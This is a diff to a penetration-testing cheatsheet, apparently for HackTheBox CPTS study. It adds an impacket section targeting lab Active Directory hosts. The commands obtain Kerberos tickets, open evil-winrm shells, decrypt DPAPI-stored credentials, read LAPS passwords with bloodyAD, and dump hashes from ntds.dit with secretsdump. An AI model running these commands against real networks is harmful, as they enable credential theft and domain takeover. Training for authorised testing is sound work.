@@ -55,6 +55,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [netexec](#netexec)
 - [certipy](#certipy)
 - [bloodyAD](#bloodyAD)
+- [impacket](#impacket)
 - [useful command](#command)
 - 
 - [Useful Resources](#useful-resources)
@@ -879,6 +880,29 @@ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb ad
 
 # sam can read the LAPS password from the ms-MCS-AdmPwd property  ( sam need have   ReadLAPSPassword permission) 
 bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb get object 'DC$' --attr ms-mcs-AdmPwd
+
+```
+## impacket 
+
+```
+# auth with kerberoas in AD   ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
+impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76       (Saving ticket in svc_winrm.ccache)
+export KRB5CCNAME=svc_winrm.ccache
+evil-winrm -i dc.voleur.htb -r voleur.htb
+
+# connect shares and  auth with kerberoas in AD  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
+impacket-smbclient -k todd.wolfe@dc.voleur.htb
+
+# dump Data Protection API (DPAPI) to get credentials ( need have 2 file) 
+impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password  <pass-of-user-todd.wolfe>                                      (key have find here)
+impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <key-have-find>
+
+with path of 2 file : 
+c:\users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
+c:\users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88
+
+# command to dump use 3 file 
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 
 
 ```
